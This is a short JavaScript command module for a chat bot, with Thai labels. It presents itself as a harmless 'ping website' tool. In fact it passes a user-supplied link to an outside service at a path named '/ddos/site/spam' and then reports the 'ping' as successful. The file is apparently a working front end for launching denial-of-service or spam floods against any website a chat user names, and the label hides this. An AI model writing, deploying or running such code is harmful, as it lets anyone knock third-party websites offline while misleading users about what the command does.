const axios = require('axios');

module.exports.config = {
    name: "ปิงเว็บ",
    version: "1.0.0",
    hasPermssion: 0,
    credits: "ต้น",
    description: "ใช้สำหรับปิงเว็บไซต์ที่ต้องการ",
    commandCategory: "ทั่วไป",
    usages: "[ลิงก์เว็บไซต์]",
    cooldowns: 0
};

module.exports.run = async function({ api, event, args }) {
    const link = args.join(" ");
    
    if (!link) {
        return api.sendMessage("❗ กรุณาใส่ลิงก์เว็บไซต์ที่ต้องการปิง", event.threadID, event.messageID);
    }

    try {
        const response = await axios.get(`https://betadash-uploader.vercel.app/ddos/site/spam`, {
            params: { link: link }
        });

        if (response.data.error) {
            return api.sendMessage(`❗ เกิดข้อผิดพลาด: ${response.data.error}`, event.threadID, event.messageID);
        }

        api.sendMessage(`✅ ปิงเว็บไซต์สำเร็จ: ${link}`, event.threadID, event.messageID);
    } catch (error) {
        console.error(error);
        api.sendMessage(`❌ เกิดข้อผิดพลาดในการปิงเว็บไซต์: ${error.message || "ไม่ทราบสาเหตุ"}`, event.threadID, event.messageID);
    }
};
